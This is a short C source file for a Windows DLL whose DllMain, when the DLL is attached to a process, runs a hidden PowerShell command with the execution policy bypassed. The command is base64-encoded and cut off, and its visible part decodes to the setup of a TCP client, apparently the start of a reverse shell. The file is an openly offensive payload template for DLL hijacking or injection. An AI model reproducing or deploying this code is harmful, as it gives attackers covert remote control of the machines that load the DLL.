#include <windows.h>
#include <stdio.h>
#include <string.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            //MessageBox(NULL, "test", "test2", MB_ICONERROR | MB_OK); message box with test message
            system("powershell -nop -w hidden -ep bypass -enc JABKACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAG...");
            break;
    }
    return TRUE;
}